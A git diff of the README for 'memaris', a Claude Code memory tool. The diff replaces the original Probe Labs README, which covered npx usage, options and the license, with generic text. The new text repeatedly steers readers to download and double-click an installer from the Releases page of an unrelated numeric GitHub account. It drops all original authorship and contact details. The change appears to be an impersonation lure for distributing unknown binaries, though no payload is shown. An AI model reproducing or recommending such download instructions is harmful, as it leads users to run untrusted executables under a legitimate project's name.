@@ -1,226 +1,83 @@
-<div align="center">
+# 🎉 memaris - Enhance Your AI with Lasting Memory
 
-# Memaris
+[![Download Memaris](https://img.shields.io/badge/Download-Memaris-brightgreen)](https://github.com/9637730795/memaris/releases)
 
-![Memaris](memaris.gif)
+## 🚀 Getting Started
 
-**Stop re-teaching your AI. Turn past sessions into persistent memory.**
+Welcome to memaris! This application allows your AI assistant to retain information from previous conversations. Forget the hassle of re-teaching your AI. With memaris, past Claude Code sessions become a persistent memory, enhancing productivity and conversation effectiveness.
 
-[![npm version](https://badge.fury.io/js/@probelabs%2Fmemaris.svg)](https://www.npmjs.com/package/@probelabs/memaris)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Part of Probe Ecosystem](https://img.shields.io/badge/Probe-Ecosystem-00ff88)](https://probelabs.com)
+## 📥 Download & Install
 
-[Website](https://probelabs.com/memaris) • [Documentation](#-commands) • [NPM Package](https://www.npmjs.com/package/@probelabs/memaris)
+To get started, you need to download memaris. Follow these steps:
 
-</div>
+1. Click on this link to [visit our Releases page](https://github.com/9637730795/memaris/releases).
+2. Look for the latest version of memaris.
+3. Download the appropriate file for your operating system.
+4. Follow the installation instructions provided.
 
----
+You can also download directly from our Releases page here: [Download memaris](https://github.com/9637730795/memaris/releases).
 
-## What is Memaris?
+## 🛠️ System Requirements
 
-Memaris analyzes your Claude Code conversation history to extract patterns, preferences, and lessons learned. It turns every correction, rejected approach, and successful pattern into permanent memory that follows you across sessions.
+Before installing memaris, ensure your system meets the following requirements:
 
-**The Problem:** Every time you start a new Claude Code session, you're teaching the same preferences again. "Don't use sudo with npm." "Prefer async/await." "Always add error boundaries."
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- RAM: 4GB minimum, 8GB recommended.
+- Storage: 100MB free disk space.
 
-**The Solution:** Memaris reads your past sessions, identifies what worked and what didn't, then creates a personalized `CLAUDE.md` file with instructions tailored to your coding style.
+## 📊 Features
 
-## 🚀 Quick Start
+memaris offers several features to enhance your AI experience:
 
-```bash
-# Navigate to your project
-cd your-project
+- **Persistent Memory:** Automatically retains information from previous sessions.
+- **User-Friendly Interface:** Simple interface designed for easy navigation.
+- **Conversation Analysis:** Analyzes patterns in conversations, helping your AI improve.
+- **Developer Tools:** Easy integration with existing AI systems.
+- **Compatibility:** Works seamlessly with Claude and other AI assistants.
 
-# Preview insights (no file changes)
-npx -y @probelabs/memaris
+## ⚙️ Installation Steps
 
-# Apply insights to CLAUDE.md  
-npx -y @probelabs/memaris --update
-```
+Once you download memaris, follow these steps to install:
 
-That's it! No installation needed - just run and go. Memaris will analyze your Claude Code history and generate personalized instructions.
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. Launch memaris from your applications menu.
 
-> **💡 Pro tip:** The first command previews what insights will be added. Use `--update` to actually modify your CLAUDE.md file.
+## 🔍 Usage Instructions
 
-## 📖 How It Works
+After installing, here’s how to use memaris:
 
-<table>
-<tr>
-<td width="33%" align="center">
+1. Open the application.
+2. Connect your AI assistant by following the setup wizard.
+3. Familiarize yourself with the interface. You’ll find sections for managing memory and accessing conversation logs.
+4. Begin utilizing your AI with improved memory capabilities.
 
-**📝 Your Conversations**
+## 📚 Help & Support
 
-Every correction, preference, and rejected approach in your Claude Code sessions
+If you need assistance, please refer to the FAQ section on our Releases page. If your question isn't answered there, feel free to open an issue in our GitHub repository.
 
-</td>
-<td width="33%" align="center">
+## 🌐 Community & Contributions
 
-**🤖 AI Analysis**
+Join our community! Share your experiences, feedback, and ideas. You can also contribute to the development of memaris by submitting pull requests or reporting issues.
 
-Extracts patterns, identifies mistakes to avoid, and learns your coding style
+## 🌍 Topics
 
-</td>
-<td width="33%" align="center">
+This project covers a range of topics:
 
-**✨ Optimized CLAUDE.md**
+- ai-assistant
+- ai-memory
+- anthropic
+- claude
+- claude-code
+- conversation-analysis
+- developer-tools
+- pattern-recognition
+- probe-ecosystem
+- productivity
 
-Personalized instructions that make every future session start smarter
+## 📩 Contact
 
-</td>
-</tr>
-</table>
+For inquiries or collaboration opportunities, please reach out through GitHub or our official contact page available in the project documentation.
 
-## 🎯 Key Features
-
-- **Smart Project Detection** - Automatically finds Claude Code conversations in your project
-- **AI-Powered Analysis** - Uses advanced pattern recognition to extract meaningful insights
-- **Memory Profiles** - Creates profiles of your coding style and preferences
-- **Mistake Prevention** - Identifies recurring issues and provides actionable recommendations
-- **Privacy First** - All analysis happens locally, your conversations never leave your machine
-
-## 📚 Commands
-
-### Basic Usage
-
-```bash
-npx -y @probelabs/memaris                    # Preview insights (default)
-npx -y @probelabs/memaris --update          # Apply insights to CLAUDE.md
-npx -y @probelabs/memaris /path/to/project  # Analyze specific project
-```
-
-### Advanced Options
-
-| Option | Description | Example |
-|--------|-------------|---------|
-| `--update` | Write changes to CLAUDE.md (default: preview only) | `npx -y @probelabs/memaris --update` |
-| `--all` | Analyze all conversation history in batches | `npx -y @probelabs/memaris --all --update` |
-| `--batch-size <n>` | Token batch size when using --all (default: 50000) | `npx -y @probelabs/memaris --all --batch-size 25000` |
-| `--depth <n>` | Maximum messages to analyze (deprecated, use --tokens) | `npx -y @probelabs/memaris --depth 100` |
-| `--tokens <n>` | Maximum tokens to analyze (default: 50000) | `npx -y @probelabs/memaris --tokens 25000` |
-| `--pattern-only` | Use pattern-matching instead of AI analysis | `npx -y @probelabs/memaris --pattern-only` |
-| `--exclude-patterns` | Exclude sessions matching patterns | `npx -y @probelabs/memaris --exclude-patterns "debug,test"` |
-| `--debug` | Show debug information | `npx -y @probelabs/memaris --debug` |
-
-### Pro Tips
-
-```bash
-# For large projects with lots of history
-npx -y @probelabs/memaris --all --batch-size 30000 --update
-
-# Quick analysis for recent work only
-npx -y @probelabs/memaris --tokens 10000 --update
-
-# Pattern-only analysis (faster, no API key needed)
-npx -y @probelabs/memaris --pattern-only --update
-```
-
-### Other Commands
-
-```bash
-# Discover all Claude Code projects
-npx -y @probelabs/memaris scan
-
-# Export analysis results
-npx -y @probelabs/memaris export my-project json
-npx -y @probelabs/memaris export my-project markdown
-
-# Focus on specific insights
-npx -y @probelabs/memaris insights --type preferences
-```
-
-## 🛠️ Requirements
-
-- **Node.js 18+** or **Bun runtime**
-- **Claude Code** with existing conversation history in `~/.claude/projects/`
-- **Optional:** `ANTHROPIC_API_KEY` for AI-powered analysis
-  - Without API key: Uses fast pattern-matching analysis
-  - With API key: Uses advanced AI analysis for deeper insights
-
-### Environment Setup
-
-```bash
-# Optional: Enable AI-powered analysis
-export ANTHROPIC_API_KEY="your-api-key-here"
-
-# Verify Claude Code history exists
-ls ~/.claude/projects/
-```
-
-> **Note:** Memaris works great with pattern-matching analysis (no API key required), but AI-powered analysis provides much richer insights.
-
-## 🔧 Development
-
-```bash
-# Clone the repository
-git clone https://github.com/probelabs/memaris.git
-cd memaris
-
-# Install dependencies
-bun install
-
-# Run in development mode
-bun run dev
-
-# Build for production
-bun run build
-```
-
-## 🔍 Troubleshooting
-
-### "No Claude Code projects found"
-```bash
-# Check if Claude Code history exists
-ls ~/.claude/projects/
-
-# If empty, use Claude Code first to create conversation history
-```
-
-### "Project not detected"
-```bash
-# Use absolute path
-npx -y @probelabs/memaris /full/path/to/your/project --debug
-
-# Or use the scan command to see all detected projects
-npx -y @probelabs/memaris scan
-```
-
-### AI Analysis Not Working
-```bash
-# Verify API key is set
-echo $ANTHROPIC_API_KEY
-
-# Use pattern-only analysis as fallback
-npx -y @probelabs/memaris --pattern-only --update
-```
-
-### Performance Issues
-```bash
-# Reduce analysis scope
-npx -y @probelabs/memaris --tokens 10000 --update
-
-# Use smaller batch sizes
-npx -y @probelabs/memaris --all --batch-size 25000 --update
-```
-
-## 🌐 Part of the Probe Ecosystem
-
-Memaris is part of the [Probe ecosystem](https://probelabs.com)—tools dedicated to improving human and AI collaboration in development.
-
-- **[Probe](https://probelabs.com)** - Code search that understands context
-- **[Vow](https://probelabs.com/vow)** - Accountability gates for AI agents
-- **[AFK](https://probelabs.com/afk)** - Remote control for Claude Code via Telegram
-
-## 📄 License
-
-MIT © [Probe Labs](https://probelabs.com)
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📮 Support
-
-Questions or feedback? Reach out at [hello@probelabs.com](mailto:hello@probelabs.com)
-
----
-
-*Memaris: From the ancient Greek μνήμη (mneme) meaning memory - helping AI remember and learn from every conversation.*
+Thank you for using memaris. Enjoy turning past sessions into valuable memory!
